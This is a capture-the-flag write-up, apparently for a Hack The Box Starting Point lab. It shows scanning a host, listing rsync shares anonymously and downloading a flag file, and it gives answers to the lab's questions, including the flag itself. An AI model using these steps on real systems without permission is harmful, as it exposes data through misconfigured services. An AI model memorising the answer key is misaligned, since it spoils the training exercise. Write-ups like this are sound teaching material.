# Tasks
- What is the default port for rsync?
	- 873
- How many TCP ports are open on the remote host?
	- 1
- What is the protocol version used by rsync on the remote machine?
	- 31
- What is the most common command name on Linux to interact with rsync?
	- rsync
- What credentials do you have to pass to rsync in order to use anonymous authentication? anonymous:anonymous, anonymous, None, rsync:rsync
	- None
- What is the option to only list shares and files on rsync? (No need to include the leading -- characters)
	- list-only
- Submit root flag
	- 72eaf5344ebb84908ae543a719830519


# Steps
- First, we run rustscan to see what services may be running on this machine.
```
rustscan --ulimit 5000 --addresses "10.129.219.70" --top -- -sC -sV
```
- We are only given that the rsync service is running on this box.
```
PORT    STATE SERVICE REASON         VERSION  
873/tcp open  rsync   syn-ack ttl 63 (protocol version 31)
```
- Using rsync, we can see the shares we can connect to using the --list-only option:
```
rsync --list-only 10.129.219.70::
```
- We are given a public and anonymous share for us
```
[Nov 20, 2025 - 22:20:24 (PST)] exegol-htb-starting-point /workspace # rsync --list-only 10.129.219.70::  
public          Anonymous Share
```
- Let's list out what files are in the public share
```
rsync --list-only 10.129.219.70::public
```
- Here, we are given that the flag file is within this share!
```
[Nov 20, 2025 - 22:29:02 (PST)] exegol-htb-starting-point /workspace # rsync --list-only 10.129.219.70::public  
drwxr-xr-x          4,096 2022/10/24 15:02:23 .  
-rw-r--r--             33 2022/10/24 14:32:03 flag.txt
```
- So, let's go ahead and get that file!
```
rsync 10.129.219.70::public/flag.txt flag.txt
```
- Now, with that, we are able to get our flag!
```
[Nov 20, 2025 - 22:31:47 (PST)] exegol-htb-starting-point /workspace # cat flag.txt                  
72eaf5344ebb84908ae543a719830519
```
